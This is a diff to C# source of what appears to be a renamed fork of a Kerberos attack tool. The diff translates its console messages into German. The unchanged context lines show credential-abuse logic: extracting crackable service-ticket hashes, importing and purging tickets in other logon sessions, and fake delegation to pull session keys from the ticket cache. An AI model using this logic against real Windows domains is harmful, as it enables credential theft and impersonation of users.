@@ -176,7 +176,7 @@ namespace CrimsonRufus {
             {
                 var errorMessage = new Win32Exception((int)winError).Message;
                 Console.WriteLine(
-                    "\r\n[X] Error {0} calling LsaCallAuthenticationPackage() for target \"{1}\" : {2}",
+                    "\r\n[X] Error {0} calling the LsaCallAuthenticationPackage Func for target \"{1}\" : {2}",
                     winError, targetName, errorMessage);
             }
 
@@ -216,7 +216,7 @@ namespace CrimsonRufus {
             // sanity checks
             if (!Helpers.IsHighIntegrity() && ( ((ulong)targetLuid != 0) || (!String.IsNullOrEmpty(targetUser)) ) )
             {
-                Console.WriteLine("[X] You need to be in high integrity for the actions specified.");
+                Console.WriteLine("[X] Sie benötigen hohe Integrität für die angegebenen Aktionen.");
                 return null;
             }
 
@@ -225,22 +225,22 @@ namespace CrimsonRufus {
                 // silent mode is for "monitor"/"harvest" to prevent this data display each time
                 if (!String.IsNullOrEmpty(targetService))
                 {
-                    Console.WriteLine("[*] Target service  : {0:x}", targetService);
+                    Console.WriteLine("[*] Ziel-Dienst  : {0:x}", targetService);
                 }
                 if (!String.IsNullOrEmpty(targetServer))
                 {
-                    Console.WriteLine("[*] Target server   : {0:x}", targetServer);
+                    Console.WriteLine("[*] Ziel-Server   : {0:x}", targetServer);
                 }
                 if (!String.IsNullOrEmpty(targetUser))
                 {
-                    Console.WriteLine("[*] Target user     : {0:x}", targetUser);
+                    Console.WriteLine("[*] Ziel-Benutzer     : {0:x}", targetUser);
                 }
                 if (((ulong)targetLuid != 0))
                 {
-                    Console.WriteLine("[*] Target LUID     : {0:x}", targetLuid);
+                    Console.WriteLine("[*] Ziel-LUID     : {0:x}", targetLuid);
                 }
 
-                Console.WriteLine("[*] Current LUID    : {0}\r\n", Helpers.GetCurrentLUID());
+                Console.WriteLine("[*] Aktueller LUID    : {0}\r\n", Helpers.GetCurrentLUID());
             }
 
             int retCode;
@@ -410,7 +410,7 @@ namespace CrimsonRufus {
             }
             catch (Exception ex)
             {
-                Console.WriteLine("[X] Exception: {0}", ex);
+                Console.WriteLine("[X] Ausnahme: {0}", ex);
                 return null;
             }
         }
@@ -599,7 +599,7 @@ namespace CrimsonRufus {
                     {
                         // can only display rc4_hmac as it doesn't have a salt. DES/AES keys require the user/domain as a salt,
                         //      and we don't have the user account name that backs the requested SPN for the ticket, no no dice :(
-                        Console.WriteLine("\r\n[!] Service ticket uses encryption type '{0}', unable to extract hash and salt.", eType);
+                        Console.WriteLine("\r\n[!] Service-Ticket verwendet Verschlüsselungstyp '{0}', Hash und Salt können nicht extrahiert werden.", eType);
                     }
                     else if (eType.Equals(Interop.KERB_ETYPE.rc4_hmac) || eType.Equals(Interop.KERB_ETYPE.des_cbc_md5))
                     {
@@ -619,7 +619,7 @@ namespace CrimsonRufus {
                     }
                     else
                     {
-                        Console.WriteLine("[!] AES256 in use but no '/serviceuser' passed, unable to generate crackable hash.");
+                        Console.WriteLine("[!] AES256 wird verwendet, aber kein '/serviceuser' übergeben, kann keinen knackbaren Hash generieren.");
                     }
                 }
             }
@@ -633,7 +633,7 @@ namespace CrimsonRufus {
                     PACTYPE pt = decryptedEncTicket.GetPac(asrepKey);
                     if (pt == null)
                     {
-                        Console.WriteLine("[X] Unable to get the PAC");
+                        Console.WriteLine("[X] PAC kann nicht abgerufen werden");
                         return;
                     }
                     
@@ -850,8 +850,8 @@ namespace CrimsonRufus {
                 }
                 catch
                 {
-                    Console.WriteLine("[!] Unable to decrypt the EncTicketPart using key: {0}", Helpers.ByteArrayToString(serviceKey));
-                    Console.WriteLine("[!] Check the right key was passed for the encryption type: {0}", (Interop.KERB_ETYPE)cred.tickets[0].enc_part.etype);
+                    Console.WriteLine("[!] EncTicketPart kann nicht mit Schlüssel entschlüsselt werden: {0}", Helpers.ByteArrayToString(serviceKey));
+                    Console.WriteLine("[!] Prüfen Sie, ob der richtige Schlüssel für den Verschlüsselungstyp übergeben wurde: {0}", (Interop.KERB_ETYPE)cred.tickets[0].enc_part.etype);
                 }
             }
 
@@ -890,7 +890,7 @@ namespace CrimsonRufus {
             }
             catch
             {
-                Console.WriteLine("[-] Error setting correct ACLs for HKLM:\\{0}", baseRegistryKey);
+                Console.WriteLine("[-] Fehler beim Setzen der korrekten ACLs für HKLM:\\{0}", baseRegistryKey);
                 basePath = null;
             }
             if (basePath != null)
@@ -915,7 +915,7 @@ namespace CrimsonRufus {
                     userData.SetValue("Flags", flags);
                     userData.SetValue("Base64EncodedTicket", base64TGT);
                 }
-                Console.WriteLine("\r\n[] Wrote {0} tickets to HKLM:\\{1}.", creds.Count, baseRegistryKey);
+                Console.WriteLine("\r\n[] {0} Tickets nach HKLM:\\{1} geschrieben.", creds.Count, baseRegistryKey);
             }
         }
 
@@ -1039,7 +1039,7 @@ namespace CrimsonRufus {
             {
                 if (!Helpers.IsHighIntegrity())
                 {
-                    Console.WriteLine("[X] You need to be in high integrity to apply a ticket to a different logon session");
+                    Console.WriteLine("[X] Sie benötigen hohe Integrität um ein Ticket auf eine andere Anmeldesitzung anzuwenden");
                     return;
                 }
             }
@@ -1082,17 +1082,17 @@ namespace CrimsonRufus {
                 {
                     var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                     var errorMessage = new Win32Exception((int)winError).Message;
-                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
+                    Console.WriteLine("[X] Fehler {0} beim Ausführen von LsaCallAuthenticationPackage: {1}", winError, errorMessage);
                     return;
                 }
                 if (ProtocalStatus != 0)
                 {
                     var winError = Interop.LsaNtStatusToWinError((uint)ProtocalStatus);
                     var errorMessage = new Win32Exception((int)winError).Message;
-                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage (ProtocalStatus): {1}", winError, errorMessage);
+                    Console.WriteLine("[X] Fehler {0} beim Ausführen von LsaCallAuthenticationPackage (ProtocolStatus): {1}", winError, errorMessage);
                     return;
                 }
-                Console.WriteLine("[+] Ticket successfully imported!");
+                Console.WriteLine("[+] Ticket erfolgreich importiert!");
             }
             finally
             {
@@ -1119,7 +1119,7 @@ namespace CrimsonRufus {
             {
                 if (!Helpers.IsHighIntegrity())
                 {
-                    Console.WriteLine("[X] You need to be in high integrity to purge tickets from a different logon session");
+                    Console.WriteLine("[X] Sie benötigen hohe Integrität um Tickets aus einer anderen Anmeldesitzung zu löschen");
                     return;
                 }
             }
@@ -1139,7 +1139,7 @@ namespace CrimsonRufus {
                 {
                     var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                     var errorMessage = new Win32Exception((int)winError).Message;
-                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
+                    Console.WriteLine("[X] Fehler {0} beim Ausführen von LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                     return;
                 }
 
@@ -1148,7 +1148,7 @@ namespace CrimsonRufus {
 
                 if ((ulong)targetLuid != 0)
                 {
-                    Console.WriteLine("[*] Target LUID: 0x{0:x}", (ulong)targetLuid);
+                    Console.WriteLine("[*] Ziel-LUID: 0x{0:x}", (ulong)targetLuid);
                     request.LogonId = targetLuid;
                 }
 
@@ -1160,17 +1160,17 @@ namespace CrimsonRufus {
                 {
                     var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                     var errorMessage = new Win32Exception((int)winError).Message;
-                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
+                    Console.WriteLine("[X] Fehler {0} beim Ausführen von LsaCallAuthenticationPackage: {1}", winError, errorMessage);
                     return;
                 }
                 if (ProtocalStatus != 0)
                 {
                     var winError = Interop.LsaNtStatusToWinError((uint)ProtocalStatus);
                     var errorMessage = new Win32Exception((int)winError).Message;
-                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage (ProtocolStatus): {1}", winError, errorMessage);
+                    Console.WriteLine("[X] Fehler {0} beim Ausführen von LsaCallAuthenticationPackage (ProtocolStatus): {1}", winError, errorMessage);
                     return;
                 }
-                Console.WriteLine("[+] Tickets successfully purged!");
+                Console.WriteLine("[+] Tickets erfolgreich gelöscht!");
             }
             finally
             {
@@ -1261,7 +1261,7 @@ namespace CrimsonRufus {
             else
             {
                 var errorMessage = new Win32Exception((int)winError).Message;
-                Console.WriteLine("\r\n[X] Error {0} calling LsaCallAuthenticationPackage() for target \"{1}\" : {2}", winError, target, errorMessage);
+                Console.WriteLine("\r\n[X] Fehler {0} beim Aufruf von LsaCallAuthenticationPackage() für Ziel \"{1}\" : {2}", winError, target, errorMessage);
                 returnedSessionKey = null;
             }
 
@@ -1287,14 +1287,14 @@ namespace CrimsonRufus {
             {
                 if (display)
                 {
-                    Console.WriteLine("[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'");
+                    Console.WriteLine("[*] Kein Ziel-SPN angegeben, versuche 'cifs/dc.domain.com' zu erstellen");
                 }
                 // try to get the current domain and domain controller
                 var domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;
                 var domainController = Networking.GetDCName(domain);
                 if (String.IsNullOrEmpty(domainController))
                 {
-                    Console.WriteLine("[X] Error retrieving current domain controller");
+                    Console.WriteLine("[X] Fehler beim Abrufen des aktuellen Domänencontrollers");
                     return null;
                 }
                 targetSPN = String.Format("cifs/{0}", domainController);
@@ -1319,7 +1319,7 @@ namespace CrimsonRufus {
 
                 if (display)
                 {
-                    Console.WriteLine("[*] Initializing Fluffy GSS-API w/ fake delegation for target '{0}'", targetSPN);
+                    Console.WriteLine("[*] Initialisiere Fluffy GSS-API mit gefälschter Delegierung für Ziel '{0}'", targetSPN);
                 }
 
                 // now initialize the fake delegate ticket for the specified targetname (default cifs/DC.domain.com)
@@ -1340,14 +1340,14 @@ namespace CrimsonRufus {
                 {
                     if (display)
                     {
-                        Console.WriteLine("[+] Fluffy GSS-API initialization success!");
+                        Console.WriteLine("[+] Fluffy GSS-API Initialisierung erfolgreich!");
                     }
 
                     if ((ClientContextAttributes & (uint)Interop.ISC_REQ.DELEGATE) == 1)
                     {
                         if (display)
                         {
-                            Console.WriteLine("[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.");
+                            Console.WriteLine("[+] Delegierungsanfrage erfolgreich! AP-REQ Delegierungsticket ist jetzt in GSS-API Ausgabe.");
                         }
 
                         // the fake delegate AP-REQ ticket is now in the cache!
@@ -1366,7 +1366,7 @@ namespace CrimsonRufus {
                             {
                                 if (display)
                                 {
-                                    Console.WriteLine("[*] Found the AP-REQ delegation ticket in the GSS-API output.");
+                                    Console.WriteLine("[*] AP-REQ Delegierungsticket in der GSS-API Ausgabe gefunden.");
                                 }
 
                                 startIndex += 2;
@@ -1386,7 +1386,7 @@ namespace CrimsonRufus {
                                         var authenticatorEtype = (Interop.KERB_ETYPE)encAuthenticator.etype;
                                         if (display)
                                         {
-                                            Console.WriteLine("[*] Authenticator etype: {0}", authenticatorEtype);
+                                            Console.WriteLine("[*] Authentifikator etype: {0}", authenticatorEtype);
                                         }
 
                                         // grab the service ticket session key from the local cache
@@ -1397,7 +1397,7 @@ namespace CrimsonRufus {
                                             var base64SessionKey = Convert.ToBase64String(key);
                                             if (display)
                                             {
-                                                Console.WriteLine("[*] Extracted the service ticket session key from the ticket cache: {0}", base64SessionKey);
+                                                Console.WriteLine("[*] Service-Ticket Sitzungsschlüssel aus Ticket-Cache extrahiert: {0}", base64SessionKey);
                                             }
 
                                             // KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR = 11
@@ -1487,36 +1487,36 @@ namespace CrimsonRufus {
                                         }
                                         else
                                         {
-                                            Console.WriteLine("[X] Error: Unable to extract session key from cache for target SPN: {0}", targetSPN);
+                                            Console.WriteLine("[X] Fehler: Sitzungsschlüssel kann nicht aus Cache für Ziel-SPN extrahiert werden: {0}", targetSPN);
                                         }
                                     }
                                 }
                             }
                             else
                             {
-                                Console.WriteLine("[X] Error: Fluffy OID not found in output buffer!");
+                                Console.WriteLine("[X] Fehler: Fluffy OID nicht im Ausgabepuffer gefunden!");
                             }
                         }
                         else
                         {
-                            Console.WriteLine("[X] Error: Fluffy OID not found in output buffer!");
+                            Console.WriteLine("[X] Fehler: Fluffy OID nicht im Ausgabepuffer gefunden!");
                         }
                     }
                     else
                     {
-                        Console.WriteLine("[X] Error: Client is not allowed to delegate to target: {0}", targetSPN);
+                        Console.WriteLine("[X] Fehler: Client darf nicht an Ziel delegieren: {0}", targetSPN);
                     }
                 }
                 else
                 {
-                    Console.WriteLine("[X] Error: InitializeSecurityContext error: {0}", status2);
+                    Console.WriteLine("[X] Fehler: InitializeSecurityContext Fehler: {0}", status2);
                 }
                 // cleanup 1
                 Interop.DeleteSecurityContext(ref ClientContext);
             }
             else
             {
-                Console.WriteLine("[X] Error: AcquireCredentialsHandle error: {0}", status);
+                Console.WriteLine("[X] Fehler: AcquireCredentialsHandle Fehler: {0}", status);
             }
 
             // cleanup 2
@@ -1552,7 +1552,7 @@ namespace CrimsonRufus {
 
             if (!string.IsNullOrWhiteSpace(srealm))
             {
-                Console.WriteLine("[*] Substituting in alternate service realm: {0}", srealm);
+                Console.WriteLine("[*] Ersetze alternativen Dienst-Realm: {0}", srealm);
                 kirbi.tickets[0].realm = srealm.ToUpper();
                 kirbi.enc_part.ticket_info[0].srealm = srealm.ToUpper();
             }
